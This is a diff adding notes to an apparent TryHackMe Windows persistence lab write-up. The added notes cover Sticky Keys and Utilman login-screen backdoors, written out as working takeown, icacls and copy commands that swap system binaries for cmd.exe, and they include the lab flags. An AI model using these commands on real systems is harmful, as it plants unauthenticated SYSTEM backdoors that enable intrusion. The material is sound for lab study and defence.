@@ -232,3 +232,32 @@ Logon scripts
 -each user has its own env variable so has to backdoor separately
 *THM{USER_TRIGGERED_PERSISTENCE_FTW}
 
+----------------------------------------------------------------------------------------------
+
+Backdoor login screen to access a terminal
+1. Sticky Keys
+-activate sticky keys by pressing shift 5 times
+-windows will execute binary C:\Windows\System32\sethc.exe
+-replace binary with a payload
+-to get cmd -> replace sethc.exe with cmd.exe
+-grant current user permission to modify it
+takeown /f c:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+yes
+-while on login screen: press shift 5 times and open cmd
+-grab flag
+*THM{BREAKING_THROUGH_LOGIN}
+
+2. Utilman
+-built-in windows application used to provide Ease of Access options during lock screen
+-clicking on utilman button executes C:\Windows\System32\Utilman.exe
+-replace Utilman.exe with cmd.exe
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\Utilman.exe /grant Administrator:F
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+yes
+-on login screen: click on utilman icon
+-grab flag
+*THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
+
